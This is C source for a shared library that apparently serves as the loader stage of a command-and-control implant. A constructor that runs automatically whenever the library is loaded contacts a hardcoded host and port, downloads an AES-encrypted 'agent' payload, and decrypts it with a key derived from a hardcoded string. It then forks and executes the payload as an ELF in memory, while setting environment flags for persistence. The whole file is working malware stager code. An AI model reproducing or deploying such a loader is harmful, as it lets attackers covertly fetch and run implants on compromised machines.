#define _GNU_SOURCE
#include "aes.h"
#include "elf.h"
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

#ifdef DEBUG
#define DEBUG_PRINT(fmt, args...) fprintf(stderr, "DEBUG: " fmt, ##args)
#else
#define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
#endif

/**
 * Decrypts data using the AES-128-CBC algorithm.
 *
 * @param data The data to decrypt.
 * @param data_size The size of the data.
 * @param key The decryption key.
 * @param iv The initialization vector.
 */
void decrypt_data(char *data, size_t data_size, const uint8_t *key,
                  const uint8_t *iv) {
  struct AES_ctx ctx;
  AES_init_ctx_iv(&ctx, key, iv);
  AES_CBC_decrypt_buffer(&ctx, (uint8_t *)data, data_size);
}

/**
 * Derives a key from a string.
 *
 * @param str The input string.
 * @param key The derived key.
 */
void derive_key_from_string(const char *str, uint8_t *key) {
  uint32_t temp_key[4] = {0};
  size_t len = strlen(str);
  for (int i = 0; i < 4; i++) {
    for (size_t j = 0; j < len / 4; j++) {
      temp_key[i] ^= ((uint32_t)str[i + j * 4]) << (j % 4 * 8);
    }
  }
  memcpy(key, temp_key, 16);
  DEBUG_PRINT("Derived key: %08x %08x %08x %08x\n", temp_key[0], temp_key[1],
              temp_key[2], temp_key[3]);
}

/**
 * Downloads a file from a specified host and port, and decrypts it using the
 * provided key.
 *
 * @param host The host to download the file from.
 * @param port The port to connect to.
 * @param path The path of the file on the server.
 * @param key The decryption key.
 * @return The decrypted data.
 */
char *download_file(const char *host, const char *port, const char *path,
                    const uint8_t *key) {
  int sockfd;
  struct addrinfo hints, *res;
  char request[BUFFER_SIZE];
  char buffer[BUFFER_SIZE];
  char *data = NULL;
  size_t data_size = 0;

  // Prepare the address info
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  if (getaddrinfo(host, port, &hints, &res) != 0) {
    perror("getaddrinfo");
    return NULL;
  }

  // Create the socket
  sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
  if (sockfd == -1) {
    perror("socket");
    freeaddrinfo(res);
    return NULL;
  }

  // Connect to the server
  if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1) {
    perror("connect");
    close(sockfd);
    freeaddrinfo(res);
    return NULL;
  }

  freeaddrinfo(res);

  // Prepare the HTTP GET request
  snprintf(request, sizeof(request),
           "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path,
           host);

  // Send the request
  if (send(sockfd, request, strlen(request), 0) == -1) {
    perror("send");
    close(sockfd);
    return NULL;
  }

  // Read the response and store in memory
  int header_end = 0;
  while (1) {
    ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
    if (bytes_received <= 0) {
      break;
    }

    // Skip HTTP headers
    if (!header_end) {
      char *header_end_ptr = strstr(buffer, "\r\n\r\n");
      if (header_end_ptr) {
        header_end = 1;
        size_t header_length = header_end_ptr - buffer + 4;
        data = realloc(data, data_size + bytes_received - header_length);
        memcpy(data + data_size, buffer + header_length,
               bytes_received - header_length);
        data_size += bytes_received - header_length;
      }
    } else {
      data = realloc(data, data_size + bytes_received);
      memcpy(data + data_size, buffer, bytes_received);
      data_size += bytes_received;
    }
  }

  close(sockfd);

  DEBUG_PRINT("Received data of size: %zu\n", data_size);

#ifdef DEBUG
  // Save the original downloaded data to disk
  FILE *file = fopen("/tmp/downloaded_data", "wb");
  if (file) {
    fwrite(data, 1, data_size, file);
    fclose(file);
    DEBUG_PRINT("Downloaded data saved to /tmp/downloaded_data\n");
  } else {
    perror("fopen");
  }
#endif

  // Strip the first 6 bytes of the downloaded data
  data += 6;
  data_size -= 6;

  // Extract the IV from the beginning of the data
  uint8_t iv[16];
  memcpy(iv, data, 16);
#ifdef DEBUG
  printf("Extracted IV: ");
  for (int i = 0; i < 16; i++) {
    printf("%02x", iv[i]);
  }
  printf("\n");
#endif

  // Decrypt the data
  decrypt_data(data + 16, data_size - 16, key, iv);

  DEBUG_PRINT("Downloaded and decrypted data of size: %zu\n", data_size - 16);

#ifdef DEBUG
  // Save the decrypted data to disk
  file = fopen("/tmp/decrypted_data", "wb");
  if (file) {
    fwrite(data + 16, 1, data_size - 16, file);
    fclose(file);
    DEBUG_PRINT("Decrypted data saved to /tmp/decrypted_data\n");
  } else {
    perror("fopen");
  }
#endif

  return data + 16;
}

/**
 * Trims trailing whitespace from a string.
 *
 * @param buffer The string to trim.
 */
void trim_str(char *buffer) { buffer[strcspn(buffer, "\r\n")] = 0; }

/**
 * Checks if a file exists.
 *
 * @param path The path to the file.
 * @return 1 if the file exists, 0 otherwise.
 */
int is_file_exist(const char *path) { return access(path, F_OK) != -1; }

/**
 * Checks if a string is present in a file.
 *
 * @param path The path to the file.
 * @param str The string to search for.
 * @return 1 if the string is found, 0 otherwise.
 */
int is_str_in_file(const char *path, const char *str) {
  FILE *fd = fopen(path, "r");
  if (!fd)
    return 0;

  char buffer[255];
  while (fgets(buffer, sizeof(buffer), fd)) {
    trim_str(buffer);
    if (strncmp(str, buffer, strlen(str)) == 0) {
      fclose(fd);
      return 1;
    }
  }
  fclose(fd);
  return 0;
}

/**
 * Initializes the library. This function is called when the library is loaded.
 */
void __attribute__((constructor)) initLibrary(void) {
  // ignore SIGCHLD
  signal(SIGCHLD, SIG_IGN);

  // prevent self delete of agent
  // see cmd/agent/main.go
  setenv("PERSISTENCE", "true", 1);
  // tell agent not to change argv
  setenv("LD", "true", 1);

  // update with the correct host, port, path, and key string
  const char *host = "192.168.122.202";
  const char *port = "8000";
  const char *path = "/agent";
  const char *key_str = "my_secret_key";
  uint8_t key[16];
  derive_key_from_string(key_str, key);
  char *buf = download_file(host, port, path, key);
  if (!buf) {
    return;
  }

  char *argv[] = {"", NULL};
  char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
                  "HOME=/tmp",
                  "PERSISTENCE=true",
                  "LD=true",
                  "VERBOSE=false",
                  NULL};

  pid_t child = fork();
  // in child process
  if (child == 0) {
    // Run the ELF
    DEBUG_PRINT("Running ELF...\n");
    elf_run(buf, argv, envv);
  }
}

/**
 * Cleans up the library. This function is called when the library is unloaded.
 */
void __attribute__((destructor)) cleanUpLibrary(void) {
  DEBUG_PRINT("Cleaning up library...\n");
}
